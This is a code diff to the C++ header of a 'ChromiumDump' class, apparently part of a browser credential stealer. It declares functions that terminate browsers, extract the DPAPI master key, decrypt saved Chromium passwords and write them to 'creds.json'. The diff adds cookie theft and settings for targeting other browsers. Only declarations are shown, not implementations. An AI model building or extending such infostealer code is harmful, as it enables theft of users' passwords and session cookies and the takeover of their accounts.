@@ -18,28 +18,35 @@ class ChromiumDump {
 	private:
 		// data
 		const BYTE v10[3] = { 'v', '1', '0' };
+		const char* DPAPI = "DPAPI";
 		DATA_BLOB masterKey;
 		wstring browserExeName;
 		string browserNickName;
 		wstring browserDataPath;
 		wstring localStatePath;
 		wstring loginDataPath;
+		wstring cookiesPath;
 		json jsonData;
 		sqlite3* db;
 		bool killBrowsers;
 		// functions
 		bool TerminateBrowsers(std::vector<wstring>);
-		bool GetBrowserPaths(wstring userProfile = L"Default");
+		bool BuildBrowserPaths(wstring userProfile = L"Default");
 		DATA_BLOB PullMasterKey();
 		string DecryptPassword(LPCVOID pEncryptedPass, DWORD dwLenEncryptedPass, BYTE key[]);
 		bool LoadSqliteDb(wstring path);
 		bool UnloadSqliteDb();
-		bool ParseSqliteDb();
+		bool ParsePasswordSqliteDb();
+		bool ParseCookiesSqliteDb();
 
 	public:
 		// data
 		// functions
 		ChromiumDump(wstring browserDataPath = L"Google\\Chrome\\User Data", wstring browserExeName = L"chrome.exe", bool killBrowsers = true);
 		bool DumpPasswordData();
+		bool DumpCookieData();
 		bool WriteJSON(wstring path = L"creds.json");
+		json getJSONData();
+		bool setBrowserDataPath(wstring browserDataPath);
+		bool setBrowserName(wstring browserExeName);
 };
